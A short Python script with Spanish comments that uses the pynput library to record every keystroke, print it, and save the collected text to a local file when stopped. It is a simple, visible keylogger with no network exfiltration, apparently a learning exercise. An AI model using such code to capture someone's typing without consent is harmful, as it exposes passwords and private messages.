from pynput import keyboard
texto_presionado = ""
def on_press(key):
    global texto_presionado
    try:
        texto_presionado = texto_presionado + '{0}'.format(
            key.char)
        print('{0}'.format(
            key.char))
        print(texto_presionado)
    except AttributeError:
        texto_presionado = texto_presionado + '{0}'.format(
            key)
        print(texto_presionado)
        print('{0}'.format(
            key))

try:
    # Collect events until released
    with keyboard.Listener(
            on_press=on_press,
    ) as listener:
        listener.join()

    # ...or, in a non-blocking fashion:
    listener = keyboard.Listener(
        on_press=on_press)
    listener.start()

except KeyboardInterrupt:
    text_file = open("teclas_presionadas", "w")
    #almacenamos la información en un fichero.
    text_file.write(texto_presionado)
    #cerramos el fichero.
    text_file.close()
